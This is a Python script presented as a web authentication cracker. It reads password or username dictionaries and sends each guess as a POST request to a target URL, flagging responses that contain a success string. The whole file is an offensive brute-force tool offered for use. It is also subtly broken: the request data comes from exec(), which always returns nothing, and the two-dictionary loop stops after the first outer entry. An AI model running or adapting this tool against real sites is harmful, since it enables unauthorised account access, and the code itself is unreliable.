import argparse,requests
payload1='nothing'
payload2='nothing'
print('__      __                               ')
print('/  \    /  \_____    ___________    ____  ')
print('\   \/\/   /\__  \  /  ___/\__  \ _/ ___\ ')
print(' \        /  / __ \_\___ \  / __ \\  \___ ')
print('  \__/\  /  (____  /____  >(____  /\___  >')
print('       \/        \/     \/      \/     \/ ')
print('Web Application Service Authentication Cracker v0.1.0')
print('Copyright (c) Gr3yPh 2024')
print('中国制造 Made in China\nThis tool is a production of the People\'s Republic of China, no other country can get it away!')
parser = argparse.ArgumentParser(description='A tool which is able to crack web applications\' service authentication')
parser.add_argument('-t','--target',type=str,help='Target URL')
parser.add_argument('--payload-count',type=int,help='Payload count (1 or 2)',default=1)
parser.add_argument('-p1','--payload1',type=str,help='The path of the first payload\'s dictionary')
parser.add_argument('-p2','--payload2',type=str,help='The path of the second payload\'s dictionary')
parser.add_argument('-f','--format',type=str,help='POST Format (use dict() to set)')
parser.add_argument('--grep-match',type=str,help='Flag items which contains grep-match value',default='success')
args=parser.parse_args()

if args.target and args.payload_count:
    if args.payload_count == 1:
        if args.payload1:
            if args.format and 'dict' in args.format:
                print('[*]Starting attack...')
                try:
                    f=open(args.payload1,'r')
                except:
                    print('[-]Have trouble opening dictionary file, Please check if the file is valid.')
                    exit()
                for payload1 in f:
                    data=exec(args.format)
                    try:
                        response=requests.post(args.target,data=data)
                    except:
                        print('[-]Have trouble connecting to the target. Check the Internet connections and try again.')
                        exit()
                    if args.grep_match.encode() in response.content:
                        print('[+]Gotcha! Printing the right payload: ',payload1,' Response length:',len(response.content))
                        exit()
                    else:
                        print('[-]Result doesn\'t contain \'',args.grep_match,'\'.. Response length:',len(response.content))
            else:
                print('[-]Missing POST format or format is invalid. QUIT!')
        else:
            print('[-]Missing payload. QUIT!')
    elif args.payload_count == 2:
        if args.payload1 and args.payload2:
            if args.format:
                print('[*]Starting attack...')
                f1=open(args.payload1,'r')
                f2=open(args.payload2,'r')
                for payload1 in f1:
                    for payload2 in f2:
                        data=exec(args.format)
                        try:
                            response=requests.post(args.target,data=data)
                        except:
                            print('[-]Have trouble connecting to the target. Check the Internet connections and try again.')
                            exit()
                        if args.grep_match.encode() in response.content:
                            print('[+]Gotcha! Printing the right payload: ',payload1,' and ',payload2,' Response length:',len(response.content))
                        else:
                            print('[-]Result doesn\'t contain \'',args.grep_match,'\'.. Response length:',len(response.content))
            else:
                print('[-]Missing POST format. QUIT!')
        else:
            print('[-]Missing payload1 or payload2. QUIT!')
    else:
        print('[-]Payload count must be 1 or 2. QUIT!')
else:
    print('[-]Missing target URL or payload count. QUIT!')